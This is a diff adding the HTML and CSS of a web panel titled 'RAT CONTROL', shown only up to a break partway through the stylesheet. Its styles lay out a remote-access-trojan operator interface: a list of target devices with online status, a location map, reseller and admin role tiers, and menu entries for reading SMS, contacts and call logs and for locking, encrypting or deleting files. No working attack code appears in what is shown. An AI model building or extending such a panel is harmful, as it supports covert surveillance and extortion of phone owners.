@@ -1,0 +1,3578 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VRPCT - RAT CONTROL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Plus+Jakarta+Sans:wght@500;700;800&family=Space+Grotesk:wght@300;400;500;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js">
+    </script>
+    <style>
+        /* ===== SAMA KAYA SEBELUMNYA (tidak berubah) ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Share Tech Mono', monospace
+        }
+        body {
+            background: #0d0d14;
+            color: #e4e4f0;
+            min-height: 100vh;
+            width: 100vw;
+            overflow-x: hidden;
+            overflow-y: auto
+        }
+        body.no-scroll {
+            overflow: hidden !important
+        }
+        .screen-view {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+            min-height: 100vh;
+            padding: 24px;
+            overflow-y: auto;
+            position: relative;
+            z-index: 1
+        }
+        .screen-view.active {
+            display: flex
+        }
+        #screenLogin {
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px
+        }
+        .banner-img-wrapper {
+            width: 100%;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1)
+        }
+        .sub-brand {
+            text-align: center;
+            font-size: 1.2rem;
+            color: #e2e8f0;
+            margin-bottom: 20px
+        }
+        .login-input-container {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            margin-top: 10px;
+            margin-bottom: 15px;
+            width: 100%;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto
+        }
+        .input-box {
+            background-color: #403e19;
+            border: 2px solid #847d33;
+            border-radius: 16px;
+            padding: 20px 24px;
+            color: #fff;
+            font-size: 1.3rem;
+            outline: none;
+            width: 100%
+        }
+        .input-box::placeholder {
+            color: rgba(255, 255, 255, 0.4)
+        }
+        .btn-submit {
+            background-color: #fff;
+            color: #000;
+            border: none;
+            border-radius: 20px;
+            padding: 18px;
+            font-size: 1.3rem;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            text-align: center;
+            width: 100%;
+            margin-top: 5px;
+            transition: 0.2s
+        }
+        .btn-submit:active {
+            transform: scale(0.98)
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 5px;
+            color: #aaa;
+            font-size: 0.8rem;
+            justify-content: center
+        }
+        .checkbox-container input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer
+        }
+        .sholat-container {
+            display: flex;
+            justify-content: space-between;
+            background: #0f1015;
+            border: 1px solid #222;
+            border-radius: 16px;
+            padding: 14px 10px;
+            margin-bottom: 8px;
+            width: 100%;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+            gap: 6px
+        }
+        .sholat-item {
+            flex: 1;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            gap: 4px
+        }
+        .sholat-name {
+            font-size: .75rem;
+            color: #888;
+            font-weight: bold;
+            letter-spacing: .5px
+        }
+        .sholat-time {
+            font-size: 1rem;
+            font-weight: bold;
+            color: #00ffcc
+        }
+        .sholat-status-live {
+            text-align: center;
+            font-size: .95rem;
+            font-weight: bold;
+            color: #00ffcc;
+            margin-bottom: 16px;
+            letter-spacing: .5px;
+            text-transform: uppercase
+        }
+        .quran-section-title {
+            text-align: center;
+            font-size: 1.1rem;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 10px;
+            letter-spacing: 1px
+        }
+        .quran-horizontal-scroll {
+            display: flex;
+            gap: 10px;
+            overflow-x: auto;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto 24px;
+            padding: 4px 5px 12px;
+            scroll-behavior: smooth
+        }
+        .quran-horizontal-scroll::-webkit-scrollbar {
+            height: 6px
+        }
+        .quran-horizontal-scroll::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px
+        }
+        .quran-card-item {
+            flex: 0 0 110px;
+            background: #0f1015;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 12px 8px;
+            text-align: center;
+            cursor: pointer;
+            transition: all .2s ease
+        }
+        .quran-card-item:hover {
+            border-color: #00ffcc;
+            background: #14161f
+        }
+        .quran-card-name {
+            font-size: .85rem;
+            font-weight: bold;
+            color: #fff;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis
+        }
+        .quran-card-sub {
+            font-size: .65rem;
+            color: #888;
+            margin-top: 4px
+        }
+        .surah-header-info {
+            text-align: center;
+            margin-bottom: 20px
+        }
+        .surah-header-title {
+            font-size: 2rem;
+            color: #00ffcc;
+            font-weight: bold;
+            text-transform: uppercase
+        }
+        .surah-header-translate {
+            font-size: .9rem;
+            color: #aaa
+        }
+        .ayat-list-box {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            max-height: 65vh;
+            overflow-y: auto;
+            padding-right: 8px
+        }
+        .ayat-list-box::-webkit-scrollbar {
+            width: 6px
+        }
+        .ayat-list-box::-webkit-scrollbar-thumb {
+            background: rgba(0, 255, 204, 0.3);
+            border-radius: 10px
+        }
+        .ayat-card {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            padding-bottom: 16px
+        }
+        .ayat-num {
+            font-size: .85rem;
+            color: #ff3366;
+            margin-bottom: 8px;
+            font-weight: bold
+        }
+        .ayat-arabic {
+            font-family: 'Times New Roman', serif;
+            font-size: 1.9rem;
+            text-align: right;
+            direction: rtl;
+            line-height: 3rem;
+            color: #fff;
+            margin-bottom: 10px
+        }
+        .ayat-latin {
+            font-size: .95rem;
+            color: #00ffcc;
+            font-style: italic;
+            line-height: 1.4;
+            margin-bottom: 6px
+        }
+        .ayat-meaning {
+            font-size: .85rem;
+            color: #b3b3b3;
+            line-height: 1.4
+        }
+        .hub-wrapper {
+            width: 100%;
+            max-width: 100%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            margin-top: 30px
+        }
+        .hub-scroll-row {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            padding: 4px 2px 12px;
+            scroll-behavior: smooth;
+            -webkit-overflow-scrolling: touch
+        }
+        .hub-scroll-row .hub-card {
+            flex: 0 0 160px;
+            min-width: 140px;
+            max-width: 180px;
+            background: linear-gradient(135deg, #111, #1a1a1a);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 18px;
+            padding: 20px 14px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color .3s, transform .2s
+        }
+        .hub-scroll-row .hub-card:hover {
+            border-color: #1e70e0;
+            transform: scale(1.03)
+        }
+        .hub-scroll-row .hub-card i {
+            font-size: 2.4rem;
+            margin-bottom: 8px
+        }
+        .hub-scroll-row .hub-card-title {
+            font-size: 1rem;
+            font-weight: 800;
+            line-height: 1.3
+        }
+        .hub-scroll-row .hub-card-desc {
+            font-size: .7rem;
+            color: #888;
+            margin-top: 4px
+        }
+        .notice-admin-text {
+            text-align: center;
+            font-size: .85rem;
+            color: #ff3366;
+            margin-top: 10px;
+            padding: 0 10px;
+            line-height: 1.5;
+            letter-spacing: .8px;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+            transition: color .2s
+        }
+        .notice-admin-text:hover {
+            color: #00ffcc
+        }
+        #screenRAT {
+            padding: 0 !important
+        }
+        .rat-wrapper {
+            width: 100%;
+            max-width: 100%;
+            margin: 0;
+            position: relative;
+            height: 100%
+        }
+        .rat-container {
+            background: rgba(8, 12, 24, 0.9);
+            backdrop-filter: blur(12px);
+            border: 3px solid #00ffcc;
+            box-shadow: 0 0 40px rgba(0, 255, 200, 0.15);
+            overflow: hidden;
+            width: 100%;
+            min-height: 100vh;
+            border-radius: 0
+        }
+        .rat-header {
+            background: linear-gradient(145deg, #0a0e1a, #050810);
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 2px solid rgba(0, 255, 200, 0.4);
+            position: relative
+        }
+        .rat-logo {
+            font-size: 34px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff, #00ffcc);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 3px
+        }
+        .rat-badge {
+            display: inline-block;
+            background: rgba(0, 255, 200, 0.2);
+            padding: 6px 18px;
+            border-radius: 30px;
+            margin-top: 10px;
+            font-size: 13px;
+            color: #00ffcc;
+            border: 1px solid rgba(0, 255, 200, 0.4);
+            transition: .3s
+        }
+        .rat-back-btn {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            width: 48px;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 1.4rem;
+            cursor: pointer
+        }
+        .filter-tabs {
+            display: flex;
+            gap: 8px;
+            padding: 10px 20px;
+            border-bottom: 1px solid rgba(0, 255, 200, 0.15);
+            background: rgba(0, 0, 0, 0.3);
+            flex-wrap: wrap
+        }
+        .filter-tab {
+            padding: 8px 18px;
+            border-radius: 30px;
+            border: 1.5px solid rgba(255, 255, 255, 0.15);
+            background: transparent;
+            color: #aaa;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: .2s;
+            text-transform: uppercase;
+            letter-spacing: .5px
+        }
+        .filter-tab:hover {
+            border-color: rgba(0, 255, 200, 0.4);
+            color: #fff
+        }
+        .filter-tab.active {
+            background: rgba(0, 255, 200, 0.15);
+            border-color: #00ffcc;
+            color: #00ffcc;
+            box-shadow: 0 0 20px rgba(0, 255, 200, 0.1)
+        }
+        .filter-tab .badge {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 0 8px;
+            font-size: 10px;
+            margin-left: 6px;
+            color: #888
+        }
+        .filter-tab.active .badge {
+            background: rgba(0, 255, 200, 0.2);
+            color: #00ffcc
+        }
+        #ratRoomControl .filter-tabs {
+            display: none !important
+        }
+        .target-list-container {
+            padding: 16px 20px;
+            max-height: 65vh;
+            overflow-y: auto
+        }
+        .target-item {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 14px 18px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: .2s
+        }
+        .target-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: #00ffcc
+        }
+        .target-status-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            flex-shrink: 0;
+            border: 2px solid rgba(255, 255, 255, 0.2)
+        }
+        .target-status-dot.online {
+            background: #00ffcc;
+            box-shadow: 0 0 12px #00ffcc88
+        }
+        .target-status-dot.offline {
+            background: #ff4444;
+            box-shadow: 0 0 12px #ff444488
+        }
+        .target-info-center {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            min-width: 0
+        }
+        .target-name {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: .5px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis
+        }
+        .target-detail {
+            font-size: .75rem;
+            color: #aaa;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 12px
+        }
+        .target-detail .status-text {
+            font-weight: 600
+        }
+        .target-detail .status-text.online {
+            color: #00ffcc
+        }
+        .target-detail .status-text.offline {
+            color: #ff6666
+        }
+        .target-delete-btn {
+            background: rgba(255, 0, 0, 0.15);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-radius: 30px;
+            padding: 6px 10px;
+            color: #ff4444;
+            font-size: .8rem;
+            cursor: pointer;
+            transition: .2s;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            flex-shrink: 0
+        }
+        .target-delete-btn:hover {
+            background: rgba(255, 0, 0, 0.3);
+            border-color: #ff0000
+        }
+        /* Rename button */
+        .target-rename-btn {
+            background: rgba(0, 255, 200, 0.15);
+            border: 1px solid rgba(0, 255, 200, 0.3);
+            border-radius: 30px;
+            padding: 6px 10px;
+            color: #00ffcc;
+            font-size: .8rem;
+            cursor: pointer;
+            transition: .2s;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            flex-shrink: 0
+        }
+        .target-rename-btn:hover {
+            background: rgba(0, 255, 200, 0.3);
+            border-color: #00ffcc
+        }
+        .no-targets {
+            text-align: center;
+            color: #888;
+            padding: 30px 0;
+            font-size: 1rem
+        }
+        .rat-control-room {
+            display: none
+        }
+        .rat-control-room.active {
+            display: block
+        }
+        .rat-target-box {
+            padding: 0 20px 15px
+        }
+        .my-id-display {
+            color: #8aaee0;
+            font-size: 12px;
+            margin: 4px 0 10px 0;
+            letter-spacing: 1px;
+            text-align: center
+        }
+        .my-id-display span {
+            color: #00ffcc;
+            font-weight: bold
+        }
+        .rat-target-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.45);
+            border: 2px solid rgba(0, 255, 200, 0.4);
+            border-radius: 35px;
+            padding: 14px 18px;
+            color: #fff;
+            font-size: 14px;
+            text-align: center;
+            outline: none
+        }
+        .role-separator {
+            grid-column: 1/-1;
+            text-align: center;
+            padding: 6px 0 4px;
+            margin: 2px 0 4px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.02);
+            text-transform: uppercase;
+            color: #666
+        }
+        .role-separator.member {
+            color: #00ffcc;
+            border-color: rgba(0, 255, 204, 0.2)
+        }
+        .role-separator.reseller {
+            color: #ffaa33;
+            border-color: rgba(255, 170, 51, 0.2)
+        }
+        .role-separator.admin {
+            color: #ff3366;
+            border-color: rgba(255, 51, 102, 0.2)
+        }
+        .role-separator.boss {
+            color: #ff0000;
+            border-color: rgba(255, 0, 0, 0.3);
+            font-size: 18px;
+            letter-spacing: 4px;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5)
+        }
+        .rat-menu-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 14px;
+            padding: 16px 16px 30px
+        }
+        .rat-menu-card {
+            background: rgba(10, 14, 24, 0.85);
+            border-radius: 28px;
+            padding: 24px 10px;
+            text-align: center;
+            cursor: pointer;
+            border: 2px solid rgba(0, 255, 200, 0.2);
+            transition: .2s;
+            min-height: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center
+        }
+        .rat-menu-card:hover {
+            border-color: #00ffcc;
+            transform: translateY(-3px);
+            box-shadow: 0 0 30px rgba(0, 255, 200, 0.15)
+        }
+        .rat-menu-icon {
+            font-size: 44px;
+            margin-bottom: 8px
+        }
+        .rat-menu-title {
+            font-size: 18px;
+            font-weight: 800;
+            color: #fff;
+            letter-spacing: .5px
+        }
+        .icon-lock {
+            color: #ff4757
+        }
+        .icon-unlock {
+            color: #00ffcc
+        }
+        .icon-sos {
+            color: #ffa502
+        }
+        .icon-shield {
+            color: #ffa502
+        }
+        .icon-toast {
+            color: #2ed573
+        }
+        .icon-flash {
+            color: #ffdd44
+        }
+        .icon-reset {
+            color: #ff6b81
+        }
+        .icon-hell {
+            color: #ff0000
+        }
+        .icon-v2 {
+            color: #9b59b6
+        }
+        .icon-sms {
+            color: #66ccff
+        }
+        .icon-contact {
+            color: #66ffaa
+        }
+        .icon-calllog {
+            color: #ff88aa
+        }
+        .icon-location {
+            color: #88ddff
+        }
+        .icon-music {
+            color: #ffaa33
+        }
+        .icon-url {
+            color: #66ccff
+        }
+        .icon-volume {
+            color: #ffaa66
+        }
+        .icon-brightness {
+            color: #ffff66
+        }
+        .icon-device {
+            color: #ff88cc
+        }
+        .icon-delete {
+            color: #ff3333
+        }
+        .icon-gallery {
+            color: #ffaa00
+        }
+        .icon-encrypt {
+            color: #ff8800
+        }
+        .icon-decrypt {
+            color: #00cc88
+        }
+        .icon-file {
+            color: #66bbff
+        }
+        .icon-sdcard {
+            color: #ff6600
+        }
+        .icon-wifi {
+            color: #66ccff
+        }
+        .icon-wifi-off {
+            color: #ff6666
+        }
+        .icon-freeze {
+            color: #88ddff
+        }
+        .icon-green {
+            color: #44ff44
+        }
+        .icon-notif {
+            color: #ffaa88
+        }
+        .icon-combo {
+            color: #ffaa33
+        }
+        .icon-uncombo {
+            color: #00ffcc
+        }
+        .icon-keyboard {
+            color: #ff8800
+        }
+        .rat-room-detail {
+            display: none;
+            flex-direction: column;
+            background: #000000;
+            min-height: 100vh;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 99999;
+            overflow: hidden
+        }
+        .rat-room-detail.active {
+            display: flex
+        }
+        .room-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 10px 16px;
+            border-bottom: 1px solid #00ffcc;
+            background: #000000;
+            flex-shrink: 0;
+            z-index: 10
+        }
+        .room-header .back-btn {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #00ffcc;
+            border-radius: 30px;
+            padding: 6px 14px;
+            color: #00ffcc;
+            cursor: pointer;
+            font-size: .9rem;
+            display: flex;
+            align-items: center;
+            gap: 6px
+        }
+        .room-header .back-btn:hover {
+            background: #00ffcc33
+        }
+        .room-header .room-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #00ffcc
+        }
+        .room-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 20px;
+            padding: 20px;
+            overflow-y: auto;
+            width: 100%;
+            min-height: 300px;
+            background: #000000
+        }
+        .data-display {
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%
+        }
+        #mapContainer {
+            width: 100%;
+            max-width: 600px;
+            height: 400px;
+            border: 2px solid #00ffcc;
+            border-radius: 20px;
+            overflow: hidden;
+            background: #111;
+            margin: 0 auto 15px
+        }
+        .location-coord {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid #00ffcc;
+            border-radius: 20px;
+            padding: 12px 20px;
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+            color: #00ffcc;
+            font-size: 1rem;
+            margin: 0 auto 5px
+        }
+        .location-coord .coord-value {
+            color: #fff;
+            font-weight: bold
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: radial-gradient(circle at center, #1a0505 0, #000 90%);
+            z-index: 999999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity .6s ease;
+            pointer-events: none
+        }
+        .loading-overlay.active {
+            display: flex;
+            opacity: 1;
+            pointer-events: all
+        }
+        .loading-overlay .video-emblem {
+            width: 100%;
+            max-width: 600px;
+            aspect-ratio: 16/9;
+            border-radius: 20px;
+            overflow: hidden;
+            border: 3px solid #ff9900;
+            box-shadow: 0 0 40px #ff4500;
+            margin-bottom: 20px
+        }
+        .loading-overlay .video-emblem video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover
+        }
+        .loading-overlay .loading-text-main {
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 2.2rem;
+            color: #ff9900;
+            margin-top: 10px;
+            letter-spacing: 6px;
+            text-shadow: 0 0 15px #ff4500;
+            animation: textGlow 1.2s infinite alternate
+        }
+        .loading-overlay .loading-sub {
+            font-family: 'Inter', sans-serif;
+            font-size: .9rem;
+            color: #ffaa33;
+            margin-top: 8px;
+            letter-spacing: 2px;
+            text-shadow: 0 0 5px rgba(255, 170, 0, 0.5);
+            font-style: italic
+        }
+        .btn-skip-loading {
+            position: absolute;
+            top: 24px;
+            right: 24px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid #ff9900;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            backdrop-filter: blur(6px);
+            z-index: 10;
+            transition: .2s
+        }
+        .btn-skip-loading:hover {
+            background: #ff9900;
+            color: #000
+        }
+        .drawer {
+            position: fixed;
+            top: 0;
+            left: -280px;
+            width: 280px;
+            height: 100%;
+            background: linear-gradient(145deg, #0a0e1a, #03050a);
+            border-right: 1px solid rgba(0, 255, 200, 0.5);
+            z-index: 100000;
+            transition: left .3s cubic-bezier(.2, .9, .4, 1.1);
+            display: flex;
+            flex-direction: column;
+            backdrop-filter: blur(10px);
+            box-shadow: 5px 0 30px rgba(0, 0, 0, 0.8)
+        }
+        .drawer.open {
+            left: 0
+        }
+        .drawer-header {
+            padding: 30px 20px;
+            text-align: center;
+            border-bottom: 1px solid rgba(0, 255, 200, 0.3)
+        }
+        .drawer-video {
+            width: 100%;
+            height: 120px;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 2px solid #ff5500;
+            margin-bottom: 10px
+        }
+        .drawer-video video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover
+        }
+        .drawer-title {
+            font-family: 'Space Grotesk', monospace;
+            font-size: 1.5rem;
+            color: #00ffcc;
+            margin-top: 10px;
+            letter-spacing: 2px
+        }
+        .drawer-sub {
+            font-size: .7rem;
+            color: #ffaa33;
+            margin-top: 8px;
+            font-style: italic
+        }
+        .drawer-content {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto
+        }
+        .drawer-section {
+            margin-bottom: 25px
+        }
+        .drawer-section h4 {
+            color: #00ffcc;
+            font-size: 1rem;
+            border-left: 3px solid #00ffcc;
+            padding-left: 10px;
+            margin-bottom: 12px;
+            letter-spacing: 1px
+        }
+        .drawer-text {
+            font-size: .85rem;
+            color: #ddd;
+            line-height: 1.5;
+            margin-bottom: 8px
+        }
+        .drawer-text.clickable {
+            cursor: pointer;
+            transition: .2s;
+            padding: 4px 8px;
+            margin-left: -8px;
+            border-radius: 8px
+        }
+        .drawer-text.clickable:hover {
+            color: #00ffcc;
+            background: rgba(0, 255, 204, 0.05)
+        }
+        .warning-text {
+            color: #ff6666;
+            font-size: .8rem;
+            margin-top: 10px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding-top: 12px
+        }
+        .close-drawer {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 1.5rem;
+            cursor: pointer;
+            z-index: 10
+        }
+        .global-hamburger {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #00ffcc;
+            border-radius: 12px;
+            padding: 10px 14px;
+            cursor: pointer;
+            font-size: 1.5rem;
+            color: #00ffcc;
+            z-index: 50000;
+            backdrop-filter: blur(8px);
+            transition: .2s;
+            display: none
+        }
+        .global-hamburger:hover {
+            background: rgba(0, 255, 200, 0.3);
+            transform: scale(1.02)
+        }
+        body.logged-in .global-hamburger.active-hamburger {
+            display: block
+        }
+        body.logged-in .screen-view {
+            padding-top: 70px
+        }
+        .btn-back {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 10px 16px;
+            font-size: .9rem;
+            cursor: pointer;
+            width: fit-content;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+        .status-toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: linear-gradient(145deg, #0f172a, #1a1e2f);
+            color: #e4e4f0;
+            border: 1px solid rgba(0, 255, 204, 0.3);
+            box-shadow: 0 8px 32px rgba(0, 255, 204, 0.15), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            padding: 14px 24px;
+            border-radius: 40px;
+            font-weight: 700;
+            letter-spacing: .5px;
+            font-size: 1rem;
+            z-index: 110000;
+            opacity: 0;
+            pointer-events: none;
+            width: auto;
+            max-width: 90%;
+            min-width: 200px;
+            text-align: center;
+            transition: all .3s cubic-bezier(.2, .9, .4, 1.1)
+        }
+        .status-toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1
+        }
+        .video-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            object-fit: cover;
+            opacity: 0.35
+        }
+        .screen-view {
+            position: relative;
+            z-index: 1
+        }
+        .screen-view:not(.naga-bg-active) .video-bg {
+            display: none
+        }
+        .rat-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(16px);
+            z-index: 30000;
+            display: none;
+            justify-content: center;
+            align-items: center
+        }
+        .rat-modal-overlay.show {
+            display: flex
+        }
+        .rat-modal-card {
+            background: #0f172a;
+            border-radius: 36px;
+            padding: 30px 24px;
+            width: 85%;
+            max-width: 380px;
+            text-align: center;
+            border: 1px solid #00ffcc;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6)
+        }
+        .rat-modal-input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 255, 200, 0.3);
+            border-radius: 30px;
+            padding: 12px 16px;
+            color: #fff;
+            font-size: 13px;
+            margin-bottom: 12px;
+            outline: none;
+            text-align: center
+        }
+        .rat-btn {
+            background: linear-gradient(95deg, #00ffcc, #0099aa);
+            border: none;
+            padding: 12px;
+            border-radius: 30px;
+            color: #000;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            font-size: 13px
+        }
+        .rat-btn-secondary {
+            background: rgba(255, 255, 255, 0.08);
+            color: #fff;
+            margin-top: 12px
+        }
+        .confirm-dialog {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.88);
+            backdrop-filter: blur(14px);
+            z-index: 50000;
+            display: none;
+            justify-content: center;
+            align-items: center
+        }
+        .confirm-dialog.show {
+            display: flex
+        }
+        .confirm-box {
+            background: #0f172a;
+            border: 2px solid #00ffcc;
+            border-radius: 40px;
+            padding: 34px 28px;
+            width: 88%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 0 70px rgba(0, 255, 200, 0.15)
+        }
+        .confirm-box .icon {
+            font-size: 72px;
+            display: block;
+            margin-bottom: 10px
+        }
+        .confirm-box .title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 6px;
+            letter-spacing: 1px
+        }
+        .confirm-box .desc {
+            font-size: 15px;
+            color: #aaa;
+            margin-bottom: 0px;
+            line-height: 1.4
+        }
+        .confirm-box .btn-group {
+            display: flex;
+            gap: 14px
+        }
+        .confirm-box .btn-group .btn-confirm {
+            flex: 1;
+            padding: 14px;
+            border-radius: 40px;
+            border: none;
+            font-weight: 800;
+            cursor: pointer;
+            font-size: 16px;
+            transition: .2s;
+            letter-spacing: 1px
+        }
+        .btn-confirm.yes {
+            background: linear-gradient(95deg, #00ffcc, #0099aa);
+            color: #000
+        }
+        .btn-confirm.yes:hover {
+            transform: scale(1.03)
+        }
+        .btn-confirm.no {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2)
+        }
+        .btn-confirm.no:hover {
+            background: rgba(255, 255, 255, 0.2)
+        }
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 6px
+        }
+        ::-webkit-scrollbar-track {
+            background: #0f1622
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #2d3a4e;
+            border-radius: 10px
+        }
+        .spinner-360 {
+            display: inline-block;
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(0, 255, 204, 0.15);
+            border-top-color: #00ffcc;
+            border-radius: 50%;
+            animation: spin360 .8s linear infinite
+        }
+        @keyframes spin360 {
+            to {
+                transform: rotate(360deg)
+            }
+        }
+        .spinner-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px
+        }
+        .input-group {
+            width: 100%;
+            margin-bottom: 16px
+        }
+        .input-group label {
+            display: block;
+            color: #8aaee0;
+            font-size: .9rem;
+            margin-bottom: 6px
+        }
+        .input-group input[type="number"] {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 255, 200, 0.3);
+            border-radius: 30px;
+            padding: 12px 16px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            text-align: center
+        }
+        .device-info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            width: 100%;
+            max-width: 500px
+        }
+        .device-info-item {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 200, 0.3);
+            border-radius: 16px;
+            padding: 16px;
+            text-align: center
+        }
+        .device-info-item .label {
+            color: #8aaee0;
+            font-size: .8rem;
+            display: flex;
+            align-items: center;
